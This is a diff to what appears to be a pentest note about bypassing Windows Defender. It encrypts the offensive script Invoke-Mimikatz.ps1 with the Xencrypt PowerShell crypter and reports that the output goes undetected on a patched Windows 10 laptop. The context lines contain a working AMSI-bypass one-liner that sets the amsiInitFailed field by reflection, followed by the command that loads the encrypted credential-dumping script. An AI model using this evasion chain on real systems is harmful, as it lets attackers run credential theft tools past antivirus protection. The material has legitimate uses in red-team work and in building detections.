@@ -4,15 +4,15 @@ Simple AV bypass using the tool 'Xencrypt' (PowerShell crypter)
 
 => Source: https://github.com/the-xentropy/xencrypt
 
-The objective is to use 'Xencrypt' to encrypt offensive powershell scripts so we can copy them on the disk of a target Windows laptop or Windows server   
+The objective is to use 'Xencrypt.ps1' to encrypt offensive powershell scripts to be able to copy them on the disk of a target Windows laptop or Windows server   
 without having them being detected and deleted by Defender AV (or other AV products)
 
 Obvisouly before running the encrypted offensive powershell scripts (stored locally on our target) it will still be necessary to bypass the AMSI first
 to avoid AV detection.
 
-===================================================================================================
-Example with 'Invoke-mimkatz.ps1' 
-===================================================================================================
+=========================================================================================================================================================
+PoC - Example with the script 'Invoke-mimkatz.ps1' and a Windows 10 laptop (fully patched with Defender AV enabled and up-to-date)
+=========================================================================================================================================================
 
 Step 1 - Encrypt the script 'Invoke-mimkatz.ps1' with 3 iterations of Xencrypt
 ----------------------------------------------------------------------------------
@@ -61,13 +61,13 @@ under certain conditions.
 [*] Writing 'C:\Users\Administrator.PO718687\Desktop\invoke-encryptedm1m1.ps1' ...
 [+] Done!
 
-=> The file generated is not detected by the Windows Defender antivirus.
+=> The file generated (invoke-encryptedm1m1.ps1) is not detected by the Windows Defender antivirus.
 
 
 Step 2 - Check that the encrypted 'invoke-mimkatz.ps1' is working properly by running it (after bypassing the AMSI)
 ---------------------------------------------------------------------------------------------------------------------
 
-=> Note: The xecution is a bit slow due to the 3 layers of encryption...
+=> Note: The execution of 'invoke-mimkatz' is a bit slower than usual due to the 3 layers of encryption.
 
 PS C:\Users\Administrator\Desktop> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
 PS C:\Users\Administrator\Desktop> . .\invoke-encryptedm1m1.ps1
